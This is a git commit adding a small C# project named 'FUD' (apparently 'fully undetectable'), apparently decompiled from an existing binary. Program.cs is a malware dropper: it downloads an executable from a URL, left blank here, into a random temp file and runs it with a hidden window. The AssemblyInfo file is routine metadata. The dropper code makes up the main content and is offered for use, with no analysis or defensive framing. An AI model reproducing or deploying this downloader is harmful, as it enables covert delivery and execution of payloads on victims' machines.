392cdda6412d3338e6c96eb651ac3281a644353b
Paimon <88497195+NesarMoon@users.noreply.github.com>
2022-02-16 22:56:43 +0700

    Add files via upload

---
+++ FUD/Program.cs
@@ -0,0 +1,48 @@
+﻿using System;
+using System.Diagnostics;
+using System.IO;
+using System.Net;
+
+namespace FUD
+{
+	// Token: 0x02000002 RID: 2
+	internal class Program
+	{
+		// Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
+		private static void Main(string[] args)
+		{
+			string url = "";
+			string fileLocate = Program.FileName();
+			Program.FileName();
+			Program.Download(fileLocate, url);
+			Program.Runprocess(fileLocate);
+		}
+
+		// Token: 0x06000002 RID: 2 RVA: 0x0000207A File Offset: 0x0000027A
+		private static void Download(string FileLocate, string url)
+		{
+			new WebClient().DownloadFile(new Uri(url), FileLocate + ".exe");
+		}
+
+		// Token: 0x06000003 RID: 3 RVA: 0x00002098 File Offset: 0x00000298
+		private static string FileName()
+		{
+			string tempPath = Path.GetTempPath();
+			string Ran = Path.GetRandomFileName();
+			return tempPath + Ran;
+		}
+
+		// Token: 0x06000004 RID: 4 RVA: 0x000020B6 File Offset: 0x000002B6
+		private static void Runprocess(string FileLocate)
+		{
+			new Process
+			{
+				StartInfo = 
+				{
+					FileName = FileLocate + ".exe",
+					WindowStyle = ProcessWindowStyle.Hidden
+				}
+			}.Start();
+		}
+	}
+}
---
+++ FUD/Properties/AssemblyInfo.cs
@@ -0,0 +1,18 @@
+﻿using System;
+using System.Diagnostics;
+using System.Reflection;
+using System.Runtime.CompilerServices;
+using System.Runtime.InteropServices;
+using System.Runtime.Versioning;
+
+[assembly: AssemblyVersion("1.0.0.0")]
+[assembly: AssemblyTitle("FUD")]
+[assembly: AssemblyDescription("")]
+[assembly: AssemblyConfiguration("")]
+[assembly: AssemblyCompany("")]
+[assembly: AssemblyProduct("FUD")]
+[assembly: AssemblyCopyright("Copyright ©  2021")]
+[assembly: AssemblyTrademark("")]
+[assembly: ComVisible(false)]
+[assembly: Guid("7fe1322b-f83c-4bdc-a2ea-12abebe73194")]
+[assembly: AssemblyFileVersion("1.0.0.0")]
